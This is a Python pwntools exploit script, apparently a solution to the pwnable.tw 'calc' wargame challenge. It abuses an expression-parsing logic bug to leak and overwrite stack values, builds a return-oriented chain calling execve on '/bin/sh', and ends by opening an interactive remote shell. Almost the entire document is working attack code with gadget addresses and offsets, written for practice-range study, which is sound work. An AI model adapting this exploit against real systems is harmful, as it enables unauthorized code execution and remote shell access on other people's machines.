#! /usr/bin/python

from pwn import *

# logic bug in eval func
# +x  to leak value at offset x
# +x+y  to add y to value at offset x
# +x-y  to sub y from value at offset x

#nc chall.pwnable.tw 10100
s = remote('chall.pwnable.tw', 10100)
#s = process('./calc')
s.recvline()

def leakAll():
    for i in range(-200, 600):  
        if i == 0:
            continue             
        a = str(i)
        if i > 0:
            a = '+' + a
        s.sendline(a)
        res = s.recvline().rstrip()
        print 'i', str(i), 'res = ', res, ' >> ', hex(int(res))
        
def write(offset, value):
    s.sendline('+' + str(offset))
    cur_val = int(s.recvline()[:-1])
    sub_val = value - cur_val	
    if sub_val < 0:	    		
	s.sendline('+' + str(offset) + '-' + str(abs(sub_val)))
    elif sub_val > 0x7fffffff:
        s.sendline('+' + str(offset) + '-' + str(0xffffffff - sub_val + 1))      
    else:
  	s.sendline('+' + str(offset) + '+' + str(sub_val))
		
    res = int(s.recvline()[:-1])
    if res < 0:
        res = 0xffffffff + int(res) + 1
    #print 'value =', value, 'res = ', res
		
def read(offset):
    s.sendline('+' + str(offset))
    res = int(s.recvline()[:-1])
    if res < 0:
        return 0xffffffff + int(res) + 1
    else:
	return res
		

#leakAll()

#0x0805c34b : pop eax ; ret                  ; 0xb
#0x080701aa : pop edx ; ret                  ; 0
#0x080701d1 : pop ecx ; pop ebx ; ret        ; 0 /bin/sh
#0x08049a21 : int 0x80

pop_eax_ret = 0x805c34b
pop_edx_ret = 0x80701aa
pop_ecx_ebx_ret = 0x80701d1
syscall = 0x8049a21

'''
#calc+186 <-- ret from calc
gdb.attach(s, """
b * calc+186
""")
'''

leak = read(360)
#print 'leak =', hex(leak)   # leak = 0xffffcf48
# ret: 0000| 0xffffcf2c --> 0x8049499 (<main+71>:mov DWORD PTR [esp],0x80bf842)
# 0xffffcf48 - 0xffffcf2c = 0x1c
ret_addr = leak - 0x1c    
log.info('ret_addr = ' + hex(ret_addr)) # ret_addr = 0xffffcf2c 


write(361, pop_eax_ret)
write(362, 0xb)
write(363, pop_edx_ret)
write(364, 0)
write(365, pop_ecx_ebx_ret)
write(366, 0)
# 0024| 0xffffcf44 --> 0xffffcf4c ("/bin/sh")
# 0xffffcf4c - 0xffffcf2c = 0x20
write(367, ret_addr + 0x20) 
write(368, syscall)
write(369, 0x6e69622f)
write(370, 0x0068732f)  


s.sendline()

s.interactive()
























